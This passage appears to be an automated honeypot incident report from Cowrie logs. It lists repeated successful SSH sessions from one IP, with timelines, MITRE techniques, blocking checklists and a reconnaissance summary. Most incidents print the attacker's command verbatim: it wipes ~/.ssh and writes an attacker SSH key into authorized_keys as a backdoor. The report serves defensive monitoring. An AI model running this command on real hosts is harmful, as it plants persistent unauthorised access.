| `2026-04-24 16:19:49` | `cowrie.client.kex` |
| `2026-04-24 16:19:49` | `cowrie.login.success` |
| `2026-04-24 16:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f809b6aa88b

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:21 |
| **Last Seen** | 2026-04-24 16:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:21:45` | `cowrie.session.connect` |
| `2026-04-24 16:21:45` | `cowrie.client.version` |
| `2026-04-24 16:21:45` | `cowrie.client.kex` |
| `2026-04-24 16:21:46` | `cowrie.login.success` |
| `2026-04-24 16:21:46` | `cowrie.session.params` |
| `2026-04-24 16:21:46` | `cowrie.command.input` |
| `2026-04-24 16:21:46` | `cowrie.command.failed` |
| `2026-04-24 16:21:47` | `cowrie.log.closed` |
| `2026-04-24 16:21:47` | `cowrie.session.params` |
| `2026-04-24 16:21:47` | `cowrie.command.input` |
| `2026-04-24 16:21:47` | `cowrie.session.file_download` |
| `2026-04-24 16:21:47` | `cowrie.log.closed` |
| `2026-04-24 16:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883a22ce07e3

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:21 |
| **Last Seen** | 2026-04-24 16:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:21:49` | `cowrie.session.connect` |
| `2026-04-24 16:21:49` | `cowrie.client.version` |
| `2026-04-24 16:21:49` | `cowrie.client.kex` |
| `2026-04-24 16:21:50` | `cowrie.login.success` |
| `2026-04-24 16:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b264a05a900

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:23 |
| **Last Seen** | 2026-04-24 16:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:23:48` | `cowrie.session.connect` |
| `2026-04-24 16:23:48` | `cowrie.client.version` |
| `2026-04-24 16:23:48` | `cowrie.client.kex` |
| `2026-04-24 16:23:49` | `cowrie.login.success` |
| `2026-04-24 16:23:49` | `cowrie.session.params` |
| `2026-04-24 16:23:49` | `cowrie.command.input` |
| `2026-04-24 16:23:49` | `cowrie.command.failed` |
| `2026-04-24 16:23:49` | `cowrie.log.closed` |
| `2026-04-24 16:23:50` | `cowrie.session.params` |
| `2026-04-24 16:23:50` | `cowrie.command.input` |
| `2026-04-24 16:23:50` | `cowrie.session.file_download` |
| `2026-04-24 16:23:50` | `cowrie.log.closed` |
| `2026-04-24 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3c781f43f5

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:23 |
| **Last Seen** | 2026-04-24 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:23:52` | `cowrie.session.connect` |
| `2026-04-24 16:23:52` | `cowrie.client.version` |
| `2026-04-24 16:23:52` | `cowrie.client.kex` |
| `2026-04-24 16:23:53` | `cowrie.login.success` |
| `2026-04-24 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50ec608250b

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:30 |
| **Last Seen** | 2026-04-24 16:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:30:01` | `cowrie.session.connect` |
| `2026-04-24 16:30:01` | `cowrie.client.version` |
| `2026-04-24 16:30:02` | `cowrie.client.kex` |
| `2026-04-24 16:30:02` | `cowrie.login.success` |
| `2026-04-24 16:30:03` | `cowrie.session.params` |
| `2026-04-24 16:30:03` | `cowrie.command.input` |
| `2026-04-24 16:30:03` | `cowrie.command.failed` |
| `2026-04-24 16:30:03` | `cowrie.log.closed` |
| `2026-04-24 16:30:03` | `cowrie.session.params` |
| `2026-04-24 16:30:03` | `cowrie.command.input` |
| `2026-04-24 16:30:03` | `cowrie.session.file_download` |
| `2026-04-24 16:30:03` | `cowrie.log.closed` |
| `2026-04-24 16:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3101d5834911

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:30 |
| **Last Seen** | 2026-04-24 16:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:30:05` | `cowrie.session.connect` |
| `2026-04-24 16:30:05` | `cowrie.client.version` |
| `2026-04-24 16:30:05` | `cowrie.client.kex` |
| `2026-04-24 16:30:06` | `cowrie.login.success` |
| `2026-04-24 16:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d06dcf56bf6

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:34 |
| **Last Seen** | 2026-04-24 16:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:34:14` | `cowrie.session.connect` |
| `2026-04-24 16:34:14` | `cowrie.client.version` |
| `2026-04-24 16:34:14` | `cowrie.client.kex` |
| `2026-04-24 16:34:15` | `cowrie.login.success` |
| `2026-04-24 16:34:15` | `cowrie.session.params` |
| `2026-04-24 16:34:15` | `cowrie.command.input` |
| `2026-04-24 16:34:15` | `cowrie.command.failed` |
| `2026-04-24 16:34:15` | `cowrie.log.closed` |
| `2026-04-24 16:34:16` | `cowrie.session.params` |
| `2026-04-24 16:34:16` | `cowrie.command.input` |
| `2026-04-24 16:34:16` | `cowrie.session.file_download` |
| `2026-04-24 16:34:16` | `cowrie.log.closed` |
| `2026-04-24 16:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3390b17850ff

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:34 |
| **Last Seen** | 2026-04-24 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:34:18` | `cowrie.session.connect` |
| `2026-04-24 16:34:18` | `cowrie.client.version` |
| `2026-04-24 16:34:18` | `cowrie.client.kex` |
| `2026-04-24 16:34:19` | `cowrie.login.success` |
| `2026-04-24 16:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48573d5b18c2

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:38 |
| **Last Seen** | 2026-04-24 16:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:38:30` | `cowrie.session.connect` |
| `2026-04-24 16:38:30` | `cowrie.client.version` |
| `2026-04-24 16:38:30` | `cowrie.client.kex` |
| `2026-04-24 16:38:31` | `cowrie.login.success` |
| `2026-04-24 16:38:31` | `cowrie.session.params` |
| `2026-04-24 16:38:31` | `cowrie.command.input` |
| `2026-04-24 16:38:31` | `cowrie.command.failed` |
| `2026-04-24 16:38:31` | `cowrie.log.closed` |
| `2026-04-24 16:38:32` | `cowrie.session.params` |
| `2026-04-24 16:38:32` | `cowrie.command.input` |
| `2026-04-24 16:38:32` | `cowrie.session.file_download` |
| `2026-04-24 16:38:32` | `cowrie.log.closed` |
| `2026-04-24 16:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3503600a481

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:38 |
| **Last Seen** | 2026-04-24 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:38:34` | `cowrie.session.connect` |
| `2026-04-24 16:38:34` | `cowrie.client.version` |
| `2026-04-24 16:38:34` | `cowrie.client.kex` |
| `2026-04-24 16:38:35` | `cowrie.login.success` |
| `2026-04-24 16:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d29e5472f2

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:42 |
| **Last Seen** | 2026-04-24 16:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:42:34` | `cowrie.session.connect` |
| `2026-04-24 16:42:34` | `cowrie.client.version` |
| `2026-04-24 16:42:34` | `cowrie.client.kex` |
| `2026-04-24 16:42:35` | `cowrie.login.success` |
| `2026-04-24 16:42:35` | `cowrie.session.params` |
| `2026-04-24 16:42:35` | `cowrie.command.input` |
| `2026-04-24 16:42:35` | `cowrie.command.failed` |
| `2026-04-24 16:42:35` | `cowrie.log.closed` |
| `2026-04-24 16:42:36` | `cowrie.session.params` |
| `2026-04-24 16:42:36` | `cowrie.command.input` |
| `2026-04-24 16:42:36` | `cowrie.session.file_download` |
| `2026-04-24 16:42:36` | `cowrie.log.closed` |
| `2026-04-24 16:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ff968b0e3c

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:42 |
| **Last Seen** | 2026-04-24 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:42:38` | `cowrie.session.connect` |
| `2026-04-24 16:42:38` | `cowrie.client.version` |
| `2026-04-24 16:42:38` | `cowrie.client.kex` |
| `2026-04-24 16:42:39` | `cowrie.login.success` |
| `2026-04-24 16:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156511c6e454

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:46 |
| **Last Seen** | 2026-04-24 16:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:46:42` | `cowrie.session.connect` |
| `2026-04-24 16:46:42` | `cowrie.client.version` |
| `2026-04-24 16:46:42` | `cowrie.client.kex` |
| `2026-04-24 16:46:43` | `cowrie.login.success` |
| `2026-04-24 16:46:43` | `cowrie.session.params` |
| `2026-04-24 16:46:43` | `cowrie.command.input` |
| `2026-04-24 16:46:43` | `cowrie.command.failed` |
| `2026-04-24 16:46:43` | `cowrie.log.closed` |
| `2026-04-24 16:46:44` | `cowrie.session.params` |
| `2026-04-24 16:46:44` | `cowrie.command.input` |
| `2026-04-24 16:46:44` | `cowrie.session.file_download` |
| `2026-04-24 16:46:44` | `cowrie.log.closed` |
| `2026-04-24 16:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ee36438249

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:46 |
| **Last Seen** | 2026-04-24 16:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:46:46` | `cowrie.session.connect` |
| `2026-04-24 16:46:46` | `cowrie.client.version` |
| `2026-04-24 16:46:46` | `cowrie.client.kex` |
| `2026-04-24 16:46:47` | `cowrie.login.success` |
| `2026-04-24 16:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c77bfbaff85

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:53 |
| **Last Seen** | 2026-04-24 16:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:53:07` | `cowrie.session.connect` |
| `2026-04-24 16:53:07` | `cowrie.client.version` |
| `2026-04-24 16:53:07` | `cowrie.client.kex` |
| `2026-04-24 16:53:08` | `cowrie.login.success` |
| `2026-04-24 16:53:08` | `cowrie.session.params` |
| `2026-04-24 16:53:08` | `cowrie.command.input` |
| `2026-04-24 16:53:08` | `cowrie.command.failed` |
| `2026-04-24 16:53:08` | `cowrie.log.closed` |
| `2026-04-24 16:53:09` | `cowrie.session.params` |
| `2026-04-24 16:53:09` | `cowrie.command.input` |
| `2026-04-24 16:53:09` | `cowrie.session.file_download` |
| `2026-04-24 16:53:09` | `cowrie.log.closed` |
| `2026-04-24 16:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77932fd7c6f5

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 16:53 |
| **Last Seen** | 2026-04-24 16:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 16:53:11` | `cowrie.session.connect` |
| `2026-04-24 16:53:11` | `cowrie.client.version` |
| `2026-04-24 16:53:11` | `cowrie.client.kex` |
| `2026-04-24 16:53:12` | `cowrie.login.success` |
| `2026-04-24 16:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.93.19[.]12` | **23** | 2026-04-24 16:12 | 2026-04-24 16:59 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `84.216.60[.]18` | **18** | 2026-04-24 16:18 | 2026-04-24 16:19 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.63[.]16` | **2** | 2026-04-24 16:12 | 2026-04-24 16:14 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.75.214[.]209` | 1 | 2026-04-24 16:12 | 2026-04-24 16:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-04-24 16:15 | 2026-04-24 16:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.163.113[.]53` | 1 | 2026-04-24 15:59 | 2026-04-24 15:59 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
